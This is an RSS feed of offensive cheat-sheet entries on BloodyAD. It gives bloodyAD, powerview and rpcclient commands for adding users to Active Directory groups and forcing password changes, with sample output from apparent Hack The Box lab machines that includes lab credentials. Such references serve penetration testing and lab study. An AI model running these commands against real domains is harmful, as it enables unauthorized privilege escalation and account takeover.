channel.title: BloodyAD on TLDRBins
channel.description: Recent content in BloodyAD on TLDRBins

item.title: AddMember
item.description: Privesc #1: Add User to Group (From Linux) bloodyAD powerview.py 1. Add User to Group # With password bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>' # With Kerberos bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>' Ref: bloodyAD 1. Connect # With password sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' $ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.

item.title: AddSelf
item.description: Privesc #1: Add self to group (From Linux) bloodyAD powerview.py 1. Add self to group # With password bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>' $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend' [+] oorend added to SERVICEMGMT # With hashes bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add groupMember '<GROUP>' '<USER>' # With Kerberos bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>' $ bloodyAD -d absolute.

item.title: ForceChangePassword
item.description: Change target user password (From Linux) BloodyAD rpcclient # Pass password or :hash into PASSWORD bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>' bloodyAD -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234' [+] Password changed successfully! Ref: bloodyAD rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <NEW_PASSWORD>' $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2 smith 23 Test1234' Change target user password (From Windows) Windows 1.
